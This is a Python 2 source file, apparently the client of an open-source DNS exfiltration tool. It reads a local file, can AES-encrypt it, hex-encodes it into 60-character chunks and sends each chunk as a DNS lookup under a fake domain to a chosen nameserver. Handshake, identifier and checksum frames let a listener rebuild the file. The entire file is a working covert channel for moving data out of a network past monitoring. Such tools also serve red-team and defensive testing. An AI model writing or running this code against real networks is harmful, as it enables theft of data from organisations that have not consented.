# The MIT License (MIT)
#
# Copyright (c) 2014-2016 Leon Jacobs
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.

import getpass
import hashlib
import optparse

import dns.resolver

from lib.Crypt import CryptString

PAYLOADS_LENGTH = 60

# Change payload length to allow for a iterator
PAYLOADS_LENGTH -= 4


def main(ip, port, file, identifier, xxd, secret):
    with open(file) as to_send:
        message = to_send.readlines()

    message = ''.join(message)

    # based on if we have a secret, we will AES crypt it with it
    if secret:
        c = CryptString(secret)
        message = c.encode(message)
        print '[INFO] Message is encypted with the secret'

    print '---START OF MESSAGE---'
    print message
    print '---END OF MESSAGE---'

    # prepare the dns service
    my_resolver = dns.resolver.Resolver(configure=False)
    my_resolver.nameservers = [ip]
    my_resolver.port = port

    if xxd:

        # the payloads will not have a iterator, so add the 4 we negated earlier
        # prepare the payload
        payloads = [''.join(message.encode('hex')[i:i + PAYLOADS_LENGTH + 4]) for i in
                    range(0, len(message.encode('hex')), PAYLOADS_LENGTH + 4)]

        iteration = 0
        for payload in payloads:

            payload_to_send = payload + '.' + fake_domain

            print '[INFO] Sending lookup for :', payload_to_send
            answer = my_resolver.query(payload_to_send, 'A')
            for res in answer:
                pass

            iteration += 1
    else:

        # prepare the payload
        payloads = [''.join(message.encode('hex')[i:i + PAYLOADS_LENGTH]) for i in
                    range(0, len(message.encode('hex')), PAYLOADS_LENGTH)]

        # prepare the first, control payload explaining how many messages to expect...
        handshake = ('0000' + str(len(payloads) + 2) + ':' + ('1' if secret else '0')).ljust(PAYLOADS_LENGTH, '0')

        # ...a message identifier...
        identifier = ('0001' + (identifier.encode('hex'))).ljust(PAYLOADS_LENGTH, '0')

        # ...and the sha1 of the message
        checksum = ('0002' + hashlib.sha1(message).hexdigest())

        # lastly, a 'null' message indicating a complete transaction
        complete = [''.ljust(PAYLOADS_LENGTH, '0')]

        # add the 3 header requests to the payload and final 'null' one
        payloads = [handshake, identifier, checksum] + payloads + complete

        iteration = 0
        for payload in payloads:

            if payload.startswith('0000') or payload.startswith('0001') or payload.startswith('0002'):
                payload_to_send = payload + '.' + fake_domain
            else:
                payload_to_send = str(iteration).rjust(4, '0') + payload + '.' + fake_domain

            print '[INFO] Sending lookup for :', payload_to_send
            answer = my_resolver.query(payload_to_send, 'A')
            for res in answer:
                if str(res) != '127.0.0.1':
                    print '[WARNING] Hmm, didnt get 127.0.0.1 as the response. Maybe you are not really talking to', \
                        ip, '. We got', res
                pass

            iteration += 1

    print '[INFO] Message sent in', iteration, 'requests'


if __name__ == '__main__':

    parser = optparse.OptionParser("usage: %prog -S <ip> -F <file>")
    parser.add_option('-S', '--server', dest='server',
                      type='string', help='specify dns server to send requests to')
    parser.add_option('-F', '--file', dest='file',
                      type='string', help='specify the file to send')
    parser.add_option('-I', '--indentifier', dest='ident', default='None',
                      type='string', help='specify a message indentifier')
    parser.add_option('-X', '--xxd', dest='xxd', default=False,
                      action='store_true', help='Enable questions to be `xxd -r` friendly (60 chars long)')
    parser.add_option('-s', '--secret', dest='secret', default=False,
                      action='store_true', help='Set the secret used for the AES encryption')
    parser.add_option('-d', '--domain', dest='domain', default='fake.io',
                      type='string', help='fake zone to use for generated lookups')
    parser.add_option('-p', '--port', dest='remote_port', default='53',
                      type='int', help='Remote listening port')

    (options, args) = parser.parse_args()

    if not options.server:
        parser.error('A server IP must be provided.')

    if not options.file:
        parser.error('A file to send must be specified')

    if len(options.ident.encode('hex')) > PAYLOADS_LENGTH - 4:
        parser.error('The message identifier is too long.')

    if options.secret:
        secret = getpass.getpass(prompt='What is the secret? ')
    else:
        secret = None

    server_ip = options.server
    server_port = options.remote_port
    file = options.file
    identifier = options.ident
    xxd = options.xxd
    fake_domain = options.domain

    # kick off the main loop
    main(server_ip, server_port, file, identifier, xxd, secret)
